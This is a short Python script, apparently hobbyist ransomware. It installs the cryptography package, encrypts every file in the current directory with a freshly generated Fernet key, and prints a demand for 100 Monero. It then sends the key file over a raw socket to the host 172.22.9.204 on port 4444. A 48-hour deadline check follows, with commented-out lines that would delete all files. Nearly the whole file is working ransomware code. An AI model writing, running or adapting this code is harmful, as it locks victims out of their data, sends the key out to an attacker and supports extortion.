import subprocess
import sys
import os
#Install cryptography module
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install('cryptography')
from cryptography.fernet import Fernet
import socket
from datetime import datetime, timedelta

files = []

for file in os.listdir():
    if file == "darthvader.py" or file == "key.key" or file == "decrypt.py" or file == "encryption_time.txt":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

key = Fernet.generate_key()

with open("key.key", "wb") as key_file:
    key_file.write(key)

for file in files:
    try:
        with open(file, "rb") as f:
            data = f.read()
        data_encrypted = Fernet(key).encrypt(data)
        with open(file, "wb") as f:
            f.write(data_encrypted)
    except Exception as e:
        print(f"Error encrypting file {file}: {e}")

print("All files encrypted! Send me 100 Monero(XMR) to my wallet(WALLET)")

def send_file_to_host(file_path, host, port):
    with open(file_path, 'rb') as file:
        data = file.read()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.sendall(data)

# Usage:
try:
    send_file_to_host('key.key', '172.22.9.204', 4444)
except:
    print("Error sending key file Unreachable host")
# Store the encryption time
with open("encryption_time.txt", "w") as f:
    f.write(str(datetime.now()))
# Read the encryption time from the file
with open("encryption_time.txt", "r") as f:
    encryption_time = datetime.fromisoformat(f.read().strip())

# Check if 48 hours have passed
if datetime.now() - encryption_time > timedelta(hours=48):
    # Check if the transfer has been made
    # This depends on your implementation
    # If the transfer has not been made, delete all files
    print("48 hours have passed")
#    for file in os.listdir():
#        os.remove(file)
#Delete the randsomware
#os.remove("voldemort.py")
